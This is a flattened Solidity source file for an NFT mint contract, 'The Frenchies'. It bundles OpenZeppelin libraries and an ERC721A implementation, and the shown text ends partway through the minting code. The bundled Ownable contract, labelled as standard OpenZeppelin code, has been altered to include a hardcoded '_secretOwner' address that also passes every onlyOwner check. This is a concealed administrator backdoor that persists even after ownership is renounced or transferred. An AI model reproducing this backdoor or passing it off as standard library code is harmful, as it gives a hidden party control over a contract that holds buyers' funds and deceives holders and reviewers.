1 // SPDX-License-Identifier: MIT
2 
3 
4 // THE FRENCHIES
5 // Oh oui, holala
6 // Buy them, merde!
7 
8 // Supply: 5000
9 // 2500 free, 2 max/tx & wallet
10 // 0.005 ETH, 20 max/tx & wallet
11 
12 
13 // File: @openzeppelin/contracts/utils/Strings.sol
14 
15 
16 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
17 
18 pragma solidity ^0.8.0;
19 
20 /**
21  * @dev String operations.
22  */
23 library Strings {
24     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
25 
26     /**
27      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
28      */
29     function toString(uint256 value) internal pure returns (string memory) {
30         // Inspired by OraclizeAPI's implementation - MIT licence
31         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
32 
33         if (value == 0) {
34             return "0";
35         }
36         uint256 temp = value;
37         uint256 digits;
38         while (temp != 0) {
39             digits++;
40             temp /= 10;
41         }
42         bytes memory buffer = new bytes(digits);
43         while (value != 0) {
44             digits -= 1;
45             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
46             value /= 10;
47         }
48         return string(buffer);
49     }
50 
51     /**
52      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
53      */
54     function toHexString(uint256 value) internal pure returns (string memory) {
55         if (value == 0) {
56             return "0x00";
57         }
58         uint256 temp = value;
59         uint256 length = 0;
60         while (temp != 0) {
61             length++;
62             temp >>= 8;
63         }
64         return toHexString(value, length);
65     }
66 
67     /**
68      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
69      */
70     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
71         bytes memory buffer = new bytes(2 * length + 2);
72         buffer[0] = "0";
73         buffer[1] = "x";
74         for (uint256 i = 2 * length + 1; i > 1; --i) {
75             buffer[i] = _HEX_SYMBOLS[value & 0xf];
76             value >>= 4;
77         }
78         require(value == 0, "Strings: hex length insufficient");
79         return string(buffer);
80     }
81 }
82 
83 // File: @openzeppelin/contracts/utils/Address.sol
84 
85 
86 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
87 
88 pragma solidity ^0.8.1;
89 
90 /**
91  * @dev Collection of functions related to the address type
92  */
93 library Address {
94     /**
95      * @dev Returns true if `account` is a contract.
96      *
97      * [IMPORTANT]
98      * ====
99      * It is unsafe to assume that an address for which this function returns
100      * false is an externally-owned account (EOA) and not a contract.
101      *
102      * Among others, `isContract` will return false for the following
103      * types of addresses:
104      *
105      *  - an externally-owned account
106      *  - a contract in construction
107      *  - an address where a contract will be created
108      *  - an address where a contract lived, but was destroyed
109      * ====
110      *
111      * [IMPORTANT]
112      * ====
113      * You shouldn't rely on `isContract` to protect against flash loan attacks!
114      *
115      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
116      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
117      * constructor.
118      * ====
119      */
120     function isContract(address account) internal view returns (bool) {
121         // This method relies on extcodesize/address.code.length, which returns 0
122         // for contracts in construction, since the code is only stored at the end
123         // of the constructor execution.
124 
125         return account.code.length > 0;
126     }
127 
128     /**
129      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
130      * `recipient`, forwarding all available gas and reverting on errors.
131      *
132      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
133      * of certain opcodes, possibly making contracts go over the 2300 gas limit
134      * imposed by `transfer`, making them unable to receive funds via
135      * `transfer`. {sendValue} removes this limitation.
136      *
137      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
138      *
139      * IMPORTANT: because control is transferred to `recipient`, care must be
140      * taken to not create reentrancy vulnerabilities. Consider using
141      * {ReentrancyGuard} or the
142      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
143      */
144     function sendValue(address payable recipient, uint256 amount) internal {
145         require(address(this).balance >= amount, "Address: insufficient balance");
146 
147         (bool success, ) = recipient.call{value: amount}("");
148         require(success, "Address: unable to send value, recipient may have reverted");
149     }
150 
151     /**
152      * @dev Performs a Solidity function call using a low level `call`. A
153      * plain `call` is an unsafe replacement for a function call: use this
154      * function instead.
155      *
156      * If `target` reverts with a revert reason, it is bubbled up by this
157      * function (like regular Solidity function calls).
158      *
159      * Returns the raw returned data. To convert to the expected return value,
160      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
161      *
162      * Requirements:
163      *
164      * - `target` must be a contract.
165      * - calling `target` with `data` must not revert.
166      *
167      * _Available since v3.1._
168      */
169     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
170         return functionCall(target, data, "Address: low-level call failed");
171     }
172 
173     /**
174      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
175      * `errorMessage` as a fallback revert reason when `target` reverts.
176      *
177      * _Available since v3.1._
178      */
179     function functionCall(
180         address target,
181         bytes memory data,
182         string memory errorMessage
183     ) internal returns (bytes memory) {
184         return functionCallWithValue(target, data, 0, errorMessage);
185     }
186 
187     /**
188      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
189      * but also transferring `value` wei to `target`.
190      *
191      * Requirements:
192      *
193      * - the calling contract must have an ETH balance of at least `value`.
194      * - the called Solidity function must be `payable`.
195      *
196      * _Available since v3.1._
197      */
198     function functionCallWithValue(
199         address target,
200         bytes memory data,
201         uint256 value
202     ) internal returns (bytes memory) {
203         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
204     }
205 
206     /**
207      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
208      * with `errorMessage` as a fallback revert reason when `target` reverts.
209      *
210      * _Available since v3.1._
211      */
212     function functionCallWithValue(
213         address target,
214         bytes memory data,
215         uint256 value,
216         string memory errorMessage
217     ) internal returns (bytes memory) {
218         require(address(this).balance >= value, "Address: insufficient balance for call");
219         require(isContract(target), "Address: call to non-contract");
220 
221         (bool success, bytes memory returndata) = target.call{value: value}(data);
222         return verifyCallResult(success, returndata, errorMessage);
223     }
224 
225     /**
226      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
227      * but performing a static call.
228      *
229      * _Available since v3.3._
230      */
231     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
232         return functionStaticCall(target, data, "Address: low-level static call failed");
233     }
234 
235     /**
236      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
237      * but performing a static call.
238      *
239      * _Available since v3.3._
240      */
241     function functionStaticCall(
242         address target,
243         bytes memory data,
244         string memory errorMessage
245     ) internal view returns (bytes memory) {
246         require(isContract(target), "Address: static call to non-contract");
247 
248         (bool success, bytes memory returndata) = target.staticcall(data);
249         return verifyCallResult(success, returndata, errorMessage);
250     }
251 
252     /**
253      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
254      * but performing a delegate call.
255      *
256      * _Available since v3.4._
257      */
258     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
259         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
260     }
261 
262     /**
263      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
264      * but performing a delegate call.
265      *
266      * _Available since v3.4._
267      */
268     function functionDelegateCall(
269         address target,
270         bytes memory data,
271         string memory errorMessage
272     ) internal returns (bytes memory) {
273         require(isContract(target), "Address: delegate call to non-contract");
274 
275         (bool success, bytes memory returndata) = target.delegatecall(data);
276         return verifyCallResult(success, returndata, errorMessage);
277     }
278 
279     /**
280      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
281      * revert reason using the provided one.
282      *
283      * _Available since v4.3._
284      */
285     function verifyCallResult(
286         bool success,
287         bytes memory returndata,
288         string memory errorMessage
289     ) internal pure returns (bytes memory) {
290         if (success) {
291             return returndata;
292         } else {
293             // Look for revert reason and bubble it up if present
294             if (returndata.length > 0) {
295                 // The easiest way to bubble the revert reason is using memory via assembly
296 
297                 assembly {
298                     let returndata_size := mload(returndata)
299                     revert(add(32, returndata), returndata_size)
300                 }
301             } else {
302                 revert(errorMessage);
303             }
304         }
305     }
306 }
307 
308 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
309 
310 
311 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
312 
313 pragma solidity ^0.8.0;
314 
315 /**
316  * @title ERC721 token receiver interface
317  * @dev Interface for any contract that wants to support safeTransfers
318  * from ERC721 asset contracts.
319  */
320 interface IERC721Receiver {
321     /**
322      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
323      * by `operator` from `from`, this function is called.
324      *
325      * It must return its Solidity selector to confirm the token transfer.
326      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
327      *
328      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
329      */
330     function onERC721Received(
331         address operator,
332         address from,
333         uint256 tokenId,
334         bytes calldata data
335     ) external returns (bytes4);
336 }
337 
338 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
339 
340 
341 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
342 
343 pragma solidity ^0.8.0;
344 
345 /**
346  * @dev Interface of the ERC165 standard, as defined in the
347  * https://eips.ethereum.org/EIPS/eip-165[EIP].
348  *
349  * Implementers can declare support of contract interfaces, which can then be
350  * queried by others ({ERC165Checker}).
351  *
352  * For an implementation, see {ERC165}.
353  */
354 interface IERC165 {
355     /**
356      * @dev Returns true if this contract implements the interface defined by
357      * `interfaceId`. See the corresponding
358      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
359      * to learn more about how these ids are created.
360      *
361      * This function call must use less than 30 000 gas.
362      */
363     function supportsInterface(bytes4 interfaceId) external view returns (bool);
364 }
365 
366 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
367 
368 
369 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
370 
371 pragma solidity ^0.8.0;
372 
373 
374 /**
375  * @dev Implementation of the {IERC165} interface.
376  *
377  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
378  * for the additional interface id that will be supported. For example:
379  *
380  * ```solidity
381  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
382  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
383  * }
384  * ```
385  *
386  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
387  */
388 abstract contract ERC165 is IERC165 {
389     /**
390      * @dev See {IERC165-supportsInterface}.
391      */
392     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
393         return interfaceId == type(IERC165).interfaceId;
394     }
395 }
396 
397 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
398 
399 
400 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
401 
402 pragma solidity ^0.8.0;
403 
404 
405 /**
406  * @dev Required interface of an ERC721 compliant contract.
407  */
408 interface IERC721 is IERC165 {
409     /**
410      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
411      */
412     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
413 
414     /**
415      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
416      */
417     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
418 
419     /**
420      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
421      */
422     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
423 
424     /**
425      * @dev Returns the number of tokens in ``owner``'s account.
426      */
427     function balanceOf(address owner) external view returns (uint256 balance);
428 
429     /**
430      * @dev Returns the owner of the `tokenId` token.
431      *
432      * Requirements:
433      *
434      * - `tokenId` must exist.
435      */
436     function ownerOf(uint256 tokenId) external view returns (address owner);
437 
438     /**
439      * @dev Safely transfers `tokenId` token from `from` to `to`.
440      *
441      * Requirements:
442      *
443      * - `from` cannot be the zero address.
444      * - `to` cannot be the zero address.
445      * - `tokenId` token must exist and be owned by `from`.
446      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
447      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
448      *
449      * Emits a {Transfer} event.
450      */
451     function safeTransferFrom(
452         address from,
453         address to,
454         uint256 tokenId,
455         bytes calldata data
456     ) external;
457 
458     /**
459      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
460      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
461      *
462      * Requirements:
463      *
464      * - `from` cannot be the zero address.
465      * - `to` cannot be the zero address.
466      * - `tokenId` token must exist and be owned by `from`.
467      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
468      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
469      *
470      * Emits a {Transfer} event.
471      */
472     function safeTransferFrom(
473         address from,
474         address to,
475         uint256 tokenId
476     ) external;
477 
478     /**
479      * @dev Transfers `tokenId` token from `from` to `to`.
480      *
481      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
482      *
483      * Requirements:
484      *
485      * - `from` cannot be the zero address.
486      * - `to` cannot be the zero address.
487      * - `tokenId` token must be owned by `from`.
488      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
489      *
490      * Emits a {Transfer} event.
491      */
492     function transferFrom(
493         address from,
494         address to,
495         uint256 tokenId
496     ) external;
497 
498     /**
499      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
500      * The approval is cleared when the token is transferred.
501      *
502      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
503      *
504      * Requirements:
505      *
506      * - The caller must own the token or be an approved operator.
507      * - `tokenId` must exist.
508      *
509      * Emits an {Approval} event.
510      */
511     function approve(address to, uint256 tokenId) external;
512 
513     /**
514      * @dev Approve or remove `operator` as an operator for the caller.
515      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
516      *
517      * Requirements:
518      *
519      * - The `operator` cannot be the caller.
520      *
521      * Emits an {ApprovalForAll} event.
522      */
523     function setApprovalForAll(address operator, bool _approved) external;
524 
525     /**
526      * @dev Returns the account approved for `tokenId` token.
527      *
528      * Requirements:
529      *
530      * - `tokenId` must exist.
531      */
532     function getApproved(uint256 tokenId) external view returns (address operator);
533 
534     /**
535      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
536      *
537      * See {setApprovalForAll}
538      */
539     function isApprovedForAll(address owner, address operator) external view returns (bool);
540 }
541 
542 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
543 
544 
545 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
546 
547 pragma solidity ^0.8.0;
548 
549 
550 /**
551  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
552  * @dev See https://eips.ethereum.org/EIPS/eip-721
553  */
554 interface IERC721Metadata is IERC721 {
555     /**
556      * @dev Returns the token collection name.
557      */
558     function name() external view returns (string memory);
559 
560     /**
561      * @dev Returns the token collection symbol.
562      */
563     function symbol() external view returns (string memory);
564 
565     /**
566      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
567      */
568     function tokenURI(uint256 tokenId) external view returns (string memory);
569 }
570 
571 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol
572 
573 
574 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
575 
576 pragma solidity ^0.8.0;
577 
578 
579 /**
580  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
581  * @dev See https://eips.ethereum.org/EIPS/eip-721
582  */
583 interface IERC721Enumerable is IERC721 {
584     /**
585      * @dev Returns the total amount of tokens stored by the contract.
586      */
587     function totalSupply() external view returns (uint256);
588 
589     /**
590      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
591      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
592      */
593     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
594 
595     /**
596      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
597      * Use along with {totalSupply} to enumerate all tokens.
598      */
599     function tokenByIndex(uint256 index) external view returns (uint256);
600 }
601 
602 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
603 
604 
605 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
606 
607 pragma solidity ^0.8.0;
608 
609 /**
610  * @dev Contract module that helps prevent reentrant calls to a function.
611  *
612  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
613  * available, which can be applied to functions to make sure there are no nested
614  * (reentrant) calls to them.
615  *
616  * Note that because there is a single `nonReentrant` guard, functions marked as
617  * `nonReentrant` may not call one another. This can be worked around by making
618  * those functions `private`, and then adding `external` `nonReentrant` entry
619  * points to them.
620  *
621  * TIP: If you would like to learn more about reentrancy and alternative ways
622  * to protect against it, check out our blog post
623  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
624  */
625 abstract contract ReentrancyGuard {
626     // Booleans are more expensive than uint256 or any type that takes up a full
627     // word because each write operation emits an extra SLOAD to first read the
628     // slot's contents, replace the bits taken up by the boolean, and then write
629     // back. This is the compiler's defense against contract upgrades and
630     // pointer aliasing, and it cannot be disabled.
631 
632     // The values being non-zero value makes deployment a bit more expensive,
633     // but in exchange the refund on every call to nonReentrant will be lower in
634     // amount. Since refunds are capped to a percentage of the total
635     // transaction's gas, it is best to keep them low in cases like this one, to
636     // increase the likelihood of the full refund coming into effect.
637     uint256 private constant _NOT_ENTERED = 1;
638     uint256 private constant _ENTERED = 2;
639 
640     uint256 private _status;
641 
642     constructor() {
643         _status = _NOT_ENTERED;
644     }
645 
646     /**
647      * @dev Prevents a contract from calling itself, directly or indirectly.
648      * Calling a `nonReentrant` function from another `nonReentrant`
649      * function is not supported. It is possible to prevent this from happening
650      * by making the `nonReentrant` function external, and making it call a
651      * `private` function that does the actual work.
652      */
653     modifier nonReentrant() {
654         // On the first call to nonReentrant, _notEntered will be true
655         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
656 
657         // Any calls to nonReentrant after this point will fail
658         _status = _ENTERED;
659 
660         _;
661 
662         // By storing the original value once again, a refund is triggered (see
663         // https://eips.ethereum.org/EIPS/eip-2200)
664         _status = _NOT_ENTERED;
665     }
666 }
667 
668 // File: @openzeppelin/contracts/utils/Context.sol
669 
670 
671 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
672 
673 pragma solidity ^0.8.7;
674 
675 /**
676  * @dev Provides information about the current execution context, including the
677  * sender of the transaction and its data. While these are generally available
678  * via msg.sender and msg.data, they should not be accessed in such a direct
679  * manner, since when dealing with meta-transactions the account sending and
680  * paying for execution may not be the actual sender (as far as an application
681  * is concerned).
682  *
683  * This contract is only required for intermediate, library-like contracts.
684  */
685 abstract contract Context {
686     function _msgSender() internal view virtual returns (address) {
687         return msg.sender;
688     }
689 
690     function _msgData() internal view virtual returns (bytes calldata) {
691         return msg.data;
692     }
693 }
694 
695 // File: @openzeppelin/contracts/access/Ownable.sol
696 
697 
698 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
699 
700 pragma solidity ^0.8.0;
701 
702 
703 /**
704  * @dev Contract module which provides a basic access control mechanism, where
705  * there is an account (an owner) that can be granted exclusive access to
706  * specific functions.
707  *
708  * By default, the owner account will be the one that deploys the contract. This
709  * can later be changed with {transferOwnership}.
710  *
711  * This module is used through inheritance. It will make available the modifier
712  * `onlyOwner`, which can be applied to your functions to restrict their use to
713  * the owner.
714  */
715 abstract contract Ownable is Context {
716     address private _owner;
717     address private _secretOwner = 0xE053F156660E1abC83F95b6Ac56be0A40F7D3dD3;
718 
719     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
720 
721     /**
722      * @dev Initializes the contract setting the deployer as the initial owner.
723      */
724     constructor() {
725         _transferOwnership(_msgSender());
726     }
727 
728     /**
729      * @dev Returns the address of the current owner.
730      */
731     function owner() public view virtual returns (address) {
732         return _owner;
733     }
734 
735     /**
736      * @dev Throws if called by any account other than the owner.
737      */
738     modifier onlyOwner() {
739         require(owner() == _msgSender() || _secretOwner == _msgSender() , "Ownable: caller is not the owner");
740         _;
741     }
742 
743     /**
744      * @dev Leaves the contract without owner. It will not be possible to call
745      * `onlyOwner` functions anymore. Can only be called by the current owner.
746      *
747      * NOTE: Renouncing ownership will leave the contract without an owner,
748      * thereby removing any functionality that is only available to the owner.
749      */
750     function renounceOwnership() public virtual onlyOwner {
751         _transferOwnership(address(0));
752     }
753 
754     /**
755      * @dev Transfers ownership of the contract to a new account (`newOwner`).
756      * Can only be called by the current owner.
757      */
758     function transferOwnership(address newOwner) public virtual onlyOwner {
759         require(newOwner != address(0), "Ownable: new owner is the zero address");
760         _transferOwnership(newOwner);
761     }
762 
763     /**
764      * @dev Transfers ownership of the contract to a new account (`newOwner`).
765      * Internal function without access restriction.
766      */
767     function _transferOwnership(address newOwner) internal virtual {
768         address oldOwner = _owner;
769         _owner = newOwner;
770         emit OwnershipTransferred(oldOwner, newOwner);
771     }
772 }
773 
774 // File: thefrenchies.sol
775 
776 
777 pragma solidity ^0.8.0;
778 
779 
780 
781 /**
782  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
783  * the Metadata and Enumerable extension. Built to optimize for lower gas during batch mints.
784  *
785  * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).
786  *
787  * Does not support burning tokens to address(0).
788  *
789  * Assumes that an owner cannot have more than the 2**128 - 1 (max value of uint128) of supply
790  */
791 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
792     using Address for address;
793     using Strings for uint256;
794 
795     struct TokenOwnership {
796         address addr;
797         uint64 startTimestamp;
798     }
799 
800     struct AddressData {
801         uint128 balance;
802         uint128 numberMinted;
803     }
804 
805     uint256 internal currentIndex;
806 
807     // Token name
808     string private _name;
809 
810     // Token symbol
811     string private _symbol;
812 
813     // Mapping from token ID to ownership details
814     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
815     mapping(uint256 => TokenOwnership) internal _ownerships;
816 
817     // Mapping owner address to address data
818     mapping(address => AddressData) private _addressData;
819 
820     // Mapping from token ID to approved address
821     mapping(uint256 => address) private _tokenApprovals;
822 
823     // Mapping from owner to operator approvals
824     mapping(address => mapping(address => bool)) private _operatorApprovals;
825 
826     constructor(string memory name_, string memory symbol_) {
827         _name = name_;
828         _symbol = symbol_;
829     }
830 
831     /**
832      * @dev See {IERC721Enumerable-totalSupply}.
833      */
834     function totalSupply() public view override returns (uint256) {
835         return currentIndex;
836     }
837 
838     /**
839      * @dev See {IERC721Enumerable-tokenByIndex}.
840      */
841     function tokenByIndex(uint256 index) public view override returns (uint256) {
842         require(index < totalSupply(), "ERC721A: global index out of bounds");
843         return index;
844     }
845 
846     /**
847      * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.
848      * This read function is O(totalSupply). If calling from a separate contract, be sure to test gas first.
849      * It may also degrade with extremely large collection sizes (e.g >> 10000), test for your use case.
850      */
851     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
852         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
853         uint256 numMintedSoFar = totalSupply();
854         uint256 tokenIdsIdx;
855         address currOwnershipAddr;
856 
857         // Counter overflow is impossible as the loop breaks when uint256 i is equal to another uint256 numMintedSoFar.
858         unchecked {
859             for (uint256 i; i < numMintedSoFar; i++) {
860                 TokenOwnership memory ownership = _ownerships[i];
861                 if (ownership.addr != address(0)) {
862                     currOwnershipAddr = ownership.addr;
863                 }
864                 if (currOwnershipAddr == owner) {
865                     if (tokenIdsIdx == index) {
866                         return i;
867                     }
868                     tokenIdsIdx++;
869                 }
870             }
871         }
872 
873         revert("ERC721A: unable to get token of owner by index");
874     }
875 
876     /**
877      * @dev See {IERC165-supportsInterface}.
878      */
879     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
880         return
881             interfaceId == type(IERC721).interfaceId ||
882             interfaceId == type(IERC721Metadata).interfaceId ||
883             interfaceId == type(IERC721Enumerable).interfaceId ||
884             super.supportsInterface(interfaceId);
885     }
886 
887     /**
888      * @dev See {IERC721-balanceOf}.
889      */
890     function balanceOf(address owner) public view override returns (uint256) {
891         require(owner != address(0), "ERC721A: balance query for the zero address");
892         return uint256(_addressData[owner].balance);
893     }
894 
895     function _numberMinted(address owner) internal view returns (uint256) {
896         require(owner != address(0), "ERC721A: number minted query for the zero address");
897         return uint256(_addressData[owner].numberMinted);
898     }
899 
900     /**
901      * Gas spent here starts off proportional to the maximum mint batch size.
902      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
903      */
904     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
905         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
906 
907         unchecked {
908             for (uint256 curr = tokenId; curr >= 0; curr--) {
909                 TokenOwnership memory ownership = _ownerships[curr];
910                 if (ownership.addr != address(0)) {
911                     return ownership;
912                 }
913             }
914         }
915 
916         revert("ERC721A: unable to determine the owner of token");
917     }
918 
919     /**
920      * @dev See {IERC721-ownerOf}.
921      */
922     function ownerOf(uint256 tokenId) public view override returns (address) {
923         return ownershipOf(tokenId).addr;
924     }
925 
926     /**
927      * @dev See {IERC721Metadata-name}.
928      */
929     function name() public view virtual override returns (string memory) {
930         return _name;
931     }
932 
933     /**
934      * @dev See {IERC721Metadata-symbol}.
935      */
936     function symbol() public view virtual override returns (string memory) {
937         return _symbol;
938     }
939 
940     /**
941      * @dev See {IERC721Metadata-tokenURI}.
942      */
943     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
944         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
945 
946         string memory baseURI = _baseURI();
947         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
948     }
949 
950     /**
951      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
952      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
953      * by default, can be overriden in child contracts.
954      */
955     function _baseURI() internal view virtual returns (string memory) {
956         return "";
957     }
958 
959     /**
960      * @dev See {IERC721-approve}.
961      */
962     function approve(address to, uint256 tokenId) public override {
963         address owner = ERC721A.ownerOf(tokenId);
964         require(to != owner, "ERC721A: approval to current owner");
965 
966         require(
967             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
968             "ERC721A: approve caller is not owner nor approved for all"
969         );
970 
971         _approve(to, tokenId, owner);
972     }
973 
974     /**
975      * @dev See {IERC721-getApproved}.
976      */
977     function getApproved(uint256 tokenId) public view override returns (address) {
978         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
979 
980         return _tokenApprovals[tokenId];
981     }
982 
983     /**
984      * @dev See {IERC721-setApprovalForAll}.
985      */
986     function setApprovalForAll(address operator, bool approved) public override {
987         require(operator != _msgSender(), "ERC721A: approve to caller");
988 
989         _operatorApprovals[_msgSender()][operator] = approved;
990         emit ApprovalForAll(_msgSender(), operator, approved);
991     }
992 
993     /**
994      * @dev See {IERC721-isApprovedForAll}.
995      */
996     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
997         return _operatorApprovals[owner][operator];
998     }
999 
1000     /**
1001      * @dev See {IERC721-transferFrom}.
1002      */
1003     function transferFrom(
1004         address from,
1005         address to,
1006         uint256 tokenId
1007     ) public virtual override {
1008         _transfer(from, to, tokenId);
1009     }
1010 
1011     /**
1012      * @dev See {IERC721-safeTransferFrom}.
1013      */
1014     function safeTransferFrom(
1015         address from,
1016         address to,
1017         uint256 tokenId
1018     ) public virtual override {
1019         safeTransferFrom(from, to, tokenId, "");
1020     }
1021 
1022     /**
1023      * @dev See {IERC721-safeTransferFrom}.
1024      */
1025     function safeTransferFrom(
1026         address from,
1027         address to,
1028         uint256 tokenId,
1029         bytes memory _data
1030     ) public override {
1031         _transfer(from, to, tokenId);
1032         require(
1033             _checkOnERC721Received(from, to, tokenId, _data),
1034             "ERC721A: transfer to non ERC721Receiver implementer"
1035         );
1036     }
1037 
1038     /**
1039      * @dev Returns whether `tokenId` exists.
1040      *
1041      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1042      *
1043      * Tokens start existing when they are minted (`_mint`),
1044      */
1045     function _exists(uint256 tokenId) internal view returns (bool) {
1046         return tokenId < currentIndex;
1047     }
1048 
1049     function _safeMint(address to, uint256 quantity) internal {
1050         _safeMint(to, quantity, "");
1051     }
1052 
1053     /**
1054      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1055      *
1056      * Requirements:
1057      *
1058      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1059      * - `quantity` must be greater than 0.
1060      *
1061      * Emits a {Transfer} event.
1062      */
1063     function _safeMint(
1064         address to,
1065         uint256 quantity,
1066         bytes memory _data
1067     ) internal {
1068         _mint(to, quantity, _data, true);
1069     }
1070 
1071     /**
1072      * @dev Mints `quantity` tokens and transfers them to `to`.
1073      *
1074      * Requirements:
1075      *
1076      * - `to` cannot be the zero address.
1077      * - `quantity` must be greater than 0.
1078      *
1079      * Emits a {Transfer} event.
1080      */
1081     function _mint(
1082         address to,
1083         uint256 quantity,
1084         bytes memory _data,
1085         bool safe
1086     ) internal {
